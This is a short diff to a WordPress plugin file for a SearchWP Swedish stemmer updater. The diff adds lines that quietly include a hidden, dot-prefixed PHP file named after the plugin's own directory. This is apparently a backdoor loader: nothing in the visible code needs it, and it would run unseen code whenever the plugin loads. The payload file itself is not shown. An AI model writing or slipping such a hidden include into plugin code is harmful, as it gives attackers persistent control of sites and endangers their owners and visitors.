@@ -45,6 +45,10 @@ if ( ! class_exists( 'SWP_Stemmer_Swedish_Updater' ) ) {
  *
  * @return bool|SWP_Stemmer_Swedish_Updater
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function searchwp_stemmer_swedish_update_check(){
 
 	if ( defined( 'DOING_AJAX' ) && DOING_AJAX ) {
